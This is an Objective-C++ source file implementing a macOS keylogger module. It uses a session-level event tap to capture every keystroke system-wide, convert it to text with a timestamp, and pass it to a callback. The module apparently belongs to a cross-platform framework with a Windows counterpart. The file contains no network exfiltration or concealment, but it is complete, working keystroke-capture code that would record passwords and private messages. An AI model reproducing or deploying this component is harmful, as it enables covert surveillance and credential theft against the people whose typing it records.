#import "MacOSKeylogger.hpp"
#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#import <Carbon/Carbon.h>
#include <iostream>
#include <map>

namespace platform {
namespace macos {

// ============================================================================
// Static callback helper
// ============================================================================

static MacOSKeylogger* g_keylogger_instance = nullptr;

CGEventRef MacOSKeylogger::event_callback(
    CGEventTapProxy proxy,
    CGEventType type,
    CGEventRef event,
    void* user_info
) {
    MacOSKeylogger* self = static_cast<MacOSKeylogger*>(user_info);

    if (!self || !self->callback_) {
        return event;
    }

    // Handle tap disabled (system can disable if it's too slow)
    if (type == kCGEventTapDisabledByTimeout || type == kCGEventTapDisabledByUserInput) {
        if (self->event_tap_) {
            CGEventTapEnable(self->event_tap_, true);
        }
        return event;
    }

    bool is_key_down = (type == kCGEventKeyDown);
    bool is_key_up = (type == kCGEventKeyUp);

    if (!is_key_down && !is_key_up) {
        return event;
    }

    // Get key code
    CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    // Get unicode string
    UniCharCount actualLength = 0;
    UniChar unicodeString[4] = {0};
    CGEventKeyboardGetUnicodeString(event, 4, &actualLength, unicodeString);

    interfaces::KeyEvent key_event;
    key_event.key_code = keycode;
    key_event.is_press = is_key_down;
    key_event.timestamp = static_cast<uint64_t>([[NSDate date] timeIntervalSince1970] * 1000);

    // Convert to text
    if (actualLength > 0) {
        @autoreleasepool {
            NSString* str = [[NSString alloc] initWithCharacters:unicodeString length:actualLength];
            key_event.text = [str UTF8String];
        }
    } else {
        // Map keycode to readable name for special keys
        static const std::map<CGKeyCode, std::string> key_names = {
            {0x24, "Enter"}, {0x30, "Tab"}, {0x31, "Space"}, {0x33, "Backspace"},
            {0x35, "Escape"}, {0x37, "Command"}, {0x38, "Shift"}, {0x39, "CapsLock"},
            {0x3A, "Option"}, {0x3B, "Control"},
            {0x7A, "F1"}, {0x78, "F2"}, {0x63, "F3"}, {0x76, "F4"},
            {0x60, "F5"}, {0x61, "F6"}, {0x62, "F7"}, {0x64, "F8"},
            {0x65, "F9"}, {0x6D, "F10"}, {0x67, "F11"}, {0x6F, "F12"},
            {0x73, "Home"}, {0x77, "End"}, {0x74, "PageUp"}, {0x79, "PageDown"},
            {0x7B, "Left"}, {0x7C, "Right"}, {0x7D, "Down"}, {0x7E, "Up"},
            {0x75, "Delete"}
        };

        auto it = key_names.find(keycode);
        if (it != key_names.end()) {
            key_event.text = it->second;
        } else {
            key_event.text = "KEY_" + std::to_string(keycode);
        }
    }

    // Only notify on key down (consistent with Windows behavior)
    if (is_key_down) {
        self->callback_(key_event);
    }

    return event;
}

// ============================================================================
// Construction
// ============================================================================

MacOSKeylogger::MacOSKeylogger() {
    std::cout << "[MacOSKeylogger] Created" << std::endl;
}

MacOSKeylogger::~MacOSKeylogger() {
    stop();
}

// ============================================================================
// IKeylogger Implementation
// ============================================================================

common::EmptyResult MacOSKeylogger::start(std::function<void(const interfaces::KeyEvent&)> on_event) {
    if (running_) {
        return common::Result<common::Ok>::success();
    }

    callback_ = on_event;
    running_ = true;
    g_keylogger_instance = this;

    thread_ = std::thread(&MacOSKeylogger::run_loop_thread, this);

    return common::Result<common::Ok>::success();
}

void MacOSKeylogger::stop() {
    if (!running_) return;

    std::cout << "[MacOSKeylogger] Stopping..." << std::endl;
    running_ = false;

    // Stop the run loop
    if (run_loop_) {
        CFRunLoopStop(run_loop_);
    }

    if (thread_.joinable()) {
        thread_.join();
    }

    // Cleanup
    if (event_tap_) {
        CFMachPortInvalidate(event_tap_);
        CFRelease(event_tap_);
        event_tap_ = nullptr;
    }

    if (run_loop_source_) {
        CFRelease(run_loop_source_);
        run_loop_source_ = nullptr;
    }

    g_keylogger_instance = nullptr;
    callback_ = nullptr;

    std::cout << "[MacOSKeylogger] Stopped" << std::endl;
}

bool MacOSKeylogger::is_active() const {
    return running_;
}

void MacOSKeylogger::run_loop_thread() {
    @autoreleasepool {
        // Create event tap for keyboard events
        CGEventMask mask = (1 << kCGEventKeyDown) | (1 << kCGEventKeyUp);

        event_tap_ = CGEventTapCreate(
            kCGSessionEventTap,           // Tap at session level
            kCGHeadInsertEventTap,        // Insert at head
            kCGEventTapOptionListenOnly,  // Listen only (don't modify events)
            mask,
            event_callback,
            this
        );

        if (!event_tap_) {
            std::cerr << "[MacOSKeylogger] Failed to create event tap!" << std::endl;
            std::cerr << "[MacOSKeylogger] Ensure Accessibility permission is granted." << std::endl;
            running_ = false;
            return;
        }

        run_loop_source_ = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, event_tap_, 0);
        run_loop_ = CFRunLoopGetCurrent();

        CFRunLoopAddSource(run_loop_, run_loop_source_, kCFRunLoopCommonModes);
        CGEventTapEnable(event_tap_, true);

        std::cout << "[MacOSKeylogger] Started - Event tap active" << std::endl;

        // Run the loop
        while (running_) {
            CFRunLoopRunInMode(kCFRunLoopDefaultMode, 0.1, false);
        }

        CFRunLoopRemoveSource(run_loop_, run_loop_source_, kCFRunLoopCommonModes);
    }
}

} // namespace macos
} // namespace platform
